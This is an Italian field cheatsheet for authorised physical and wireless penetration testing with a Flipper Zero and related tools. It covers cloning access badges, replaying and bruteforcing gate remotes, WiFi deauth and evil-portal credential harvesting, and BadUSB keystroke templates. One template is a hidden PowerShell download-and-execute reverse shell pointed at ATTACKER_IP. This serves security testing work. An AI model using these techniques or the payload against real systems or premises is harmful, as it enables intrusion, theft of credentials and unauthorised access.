# Cheatsheet - Riferimento Rapido per il Campo

Stampa questo file (2-3 pagine A4) e portalo con te durante gli engagement.

---

## Decision Tree - Quale Modulo Usare

```
Cosa devi testare?
│
├─ BADGE / CONTROLLO ACCESSI
│   ├─ Badge plastica/keyfob → NFC/RFID Detector
│   │   ├─ Campo LF (125 kHz) → RFID → Read → Clone su T5577
│   │   ├─ Campo HF (13.56 MHz) → NFC → Read → Dict/MFKey32 → Magic Card
│   │   └─ Entrambi → dual-tech: testa entrambi
│   └─ Chiave metallica (contatto) → iButton → Read → Clone su RW1990
│
├─ CANCELLO / PORTA RF
│   ├─ Frequency Analyzer → trova la frequenza
│   ├─ Sub-GHz Read → decodifica protocollo
│   │   ├─ Codice fisso → Replay immediato
│   │   ├─ Rolling code → Documenta + Rolling Flaws
│   │   └─ Non decodifica → Read RAW
│   └─ Sub-GHz Bruteforcer (solo <16 bit)
│
├─ RETE WiFi
│   ├─ ESP32 Marauder → scanap / scansta
│   ├─ sniffpmkid → cattura PMKID (offline crack)
│   ├─ deauth → forza riconnessione → sniffraw (handshake)
│   └─ evilportal → credential harvest
│
├─ TASTIERA / MOUSE WIRELESS
│   ├─ NRF24 → Channel Scan → identifica dispositivo
│   └─ MouseJacker → keystroke injection
│
├─ TV / AC / DISPLAY
│   ├─ IR → Universal Remote (prova database)
│   ├─ IR → Learn New Remote (cattura)
│   └─ IR → Scan (brute force power off)
│
├─ LAPTOP / PC (accesso fisico)
│   ├─ BadUSB → payload DuckyScript
│   ├─ Preparazione: GUI r → cmd/powershell → payload
│   └─ BLE HID (BadBT) → stesso ma wireless (10-15m)
│
└─ DISPOSITIVO IoT / EMBEDDED
    ├─ GPIO Debug → SWD Probe (ARM) / AVR Flasher
    ├─ I2C Scanner → enumera dispositivi sul bus
    ├─ SPI Mem Manager → dump flash
    └─ UART → console seriale
```

---

## Frequenze Comuni in Italia

| Frequenza | Cosa Trovi | Modulazione |
|-----------|-----------|-------------|
| **433.92 MHz** | Cancelli (Nice, Came, BFT), sensori allarme, meteo, TPMS | OOK/ASK |
| **433.42 MHz** | Tapparelle Somfy RTS | OOK |
| **434.42 MHz** | Varianti EU | OOK |
| **868.35 MHz** | FAAC, domotica EU, allarmi professionali | OOK/FSK |
| **466.075 MHz** | Pager POCSAG (ospedali, vigili del fuoco) | FSK |
| **125 kHz** | Badge condomini (EM4100), badge uffici (HID Prox) | ASK/FSK |
| **13.56 MHz** | Badge aziendali (MIFARE), card hotel, trasporti | NFC |
| **134.2 kHz** | Microchip animali (FDX-B) | ASK |
| **2.4 GHz** | WiFi, Bluetooth, mouse/tastiere wireless, Zigbee | Varie |

---

## Protocolli Access Control - Identificazione Rapida

### RFID 125 kHz (LF)

| Vedi... | Protocollo | Sicurezza | Azione |
|---------|-----------|-----------|--------|
| Keyfob blu/nero rotondo | EM4100 | ZERO | Clone T5577 (5 sec) |
| Card HID con logo | HID H10301 | ZERO | Clone T5577 + nota FC:CN |
| Card senza logo, PSK | Indala | ZERO | Clone T5577 |

### NFC 13.56 MHz (HF)

| SAK | Tipo | Sicurezza | Azione |
|-----|------|-----------|--------|
| 0x08 | MIFARE Classic 1K | Bassa (crypto1) | Dict → MFKey32 → Clone Gen4 |
| 0x18 | MIFARE Classic 4K | Bassa (crypto1) | Dict → MFKey32 → Clone Gen4 |
| 0x04 | MIFARE Ultralight | Nessuna crypto | Read diretto |
| 0x44 | MIFARE UL C | 3DES | Password attack |
| 0x20 | DESFire / NTAG | AES (forte) | Documenta come "sicuro" |

### iButton

| Tipo | Come Riconoscerlo | Azione |
|------|------------------|--------|
| DS1990A | Pasticca metallica, citofoni italiani | Clone su RW1990 |
| Cyfral | Citofoni russi/est-EU | Solo emulazione |
| Metakom | Citofoni russi/est-EU | Solo emulazione |

---

## Sub-GHz - Comandi Rapidi

| Azione | Percorso |
|--------|----------|
| Cattura segnale decodificato | Sub-GHz → Read → (attendi TX) → Save |
| Cattura segnale grezzo | Sub-GHz → Read RAW → REC → (attendi TX) → STOP → Save |
| Replay segnale | Sub-GHz → Saved → [file] → Send |
| Trova frequenza | Sub-GHz → Frequency Analyzer → (premi TX vicino) |
| Bruteforce | Sub-GHz → Bruteforcer → [protocollo] → Start |
| Analisi rolling | Sub-GHz → Rolling Flaws → [carica 2+ codici] |

---

## NFC - Workflow Rapido

```
1. NFC → Read → identifica SAK
2. Se MIFARE Classic → Dictionary Attack (automatico)
3. Se chiavi mancanti → NFC → Detect Reader → presenta al lettore x3
4. MFKey32 → recupera chiavi
5. NFC → Read (ri-leggi con tutte le chiavi) → dump completo
6. NFC → Saved → [file] → Write → posiziona Magic Card Gen4
7. Verifica: leggi la Magic Card e confronta con originale
```

---

## BadUSB - Template Rapidi

### Windows - Apri CMD come Admin
```
DELAY 1000
GUI r
DELAY 500
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 2000
ALT y
DELAY 500
```

### Windows - Reverse Shell (PowerShell)
```
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')"
ENTER
```

### macOS - Apri Terminale
```
DELAY 1000
GUI SPACE
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
```

---

## WiFi Marauder - Comandi Essenziali

| Comando | Funzione | Note |
|---------|----------|------|
| `scanap` | Lista AP | Primo comando sempre |
| `scansta` | Lista client | Dopo scanap |
| `select -a [N]` | Seleziona AP target | N = numero dalla lista |
| `sniffpmkid` | Cattura PMKID | Non serve client attivo |
| `deauth` | Deautentica client | Serve target selezionato |
| `sniffraw` | Cattura handshake | Dopo deauth |
| `stopscan` | Ferma tutto | Sempre dopo le operazioni |
| `evilportal` | Avvia captive portal | Richiede setup HTML |

---

## Kit Fisico per Engagement

### Tasca Sinistra
- Flipper Zero (carica completa)
- 5x T5577 keyfob (etichettati)
- 3x Magic Card Gen4

### Tasca Destra
- Smartphone (per note e foto)
- Powerbank 5000 mAh
- Cavo USB-C

### Zaino
- Proxmark3 RDV4 (backup)
- ESP32 Marauder (pre-flashato)
- NRF24L01+ con antenna
- CC1101 esterno con antenna SMA
- Laptop con aircrack-ng / hashcat
- Documentazione autorizzazione (SEMPRE)

### Documentazione Legale (SEMPRE con te)
- Copia del contratto di pentest
- Lettera di autorizzazione su carta intestata del cliente
- Documento di identità
- Numero del referente aziendale
- Numero del tuo avvocato

---

## Troubleshooting Rapido

| Problema | Soluzione Rapida |
|----------|-----------------|
| Sub-GHz non decodifica | Frequency Analyzer prima, poi AM↔FM |
| Replay non funziona | Avvicinati (<5m), potrebbe essere rolling code |
| NFC non legge | Badge in alto (dietro schermo), <3cm, no metallo |
| RFID non legge | Badge in basso (sotto schermo), ruota 90° |
| Emulazione RFID fallisce | Scrivi su T5577 invece (più affidabile) |
| Emulazione NFC fallisce | Usa Magic Card Gen4 |
| BadUSB layout sbagliato | Controlla lingua tastiera target |
| ESP32 non si connette | Verifica wiring UART, riflasha firmware |
| MouseJacker no signal | Avvicina antenna NRF24, cambia canale |
| IR non funziona | Punta direttamente, <5m, no luce solare diretta |
